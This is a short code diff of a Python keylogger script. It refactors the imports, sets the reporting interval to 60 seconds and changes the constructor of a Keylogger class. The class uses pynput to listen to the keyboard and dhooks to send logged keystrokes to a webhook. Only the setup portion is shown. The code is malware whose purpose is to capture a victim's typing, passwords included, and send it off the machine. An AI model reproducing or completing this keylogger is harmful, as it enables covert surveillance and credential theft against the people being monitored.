@@ -1,14 +1,14 @@
-from pynput.keyboard import Listener
-from threading import Timer
 from dhooks import Webhook
+from threading import Timer
+from pynput.keyboard import Listener
 
 
-WEBHOOK_URL = "your-custom-webhook-url"
-TIME_INTERVAL = 10  # Amount of time between each report, expressed in seconds
+WEBHOOK_URL = 'your-custom-webhook-url'
+TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.
 
 
 class Keylogger:
-    def __init__(self, webhook_url, interval=60):
+    def __init__(self, webhook_url, interval):
         self.interval = interval
         self.webhook = Webhook(webhook_url)
         self.log = ""
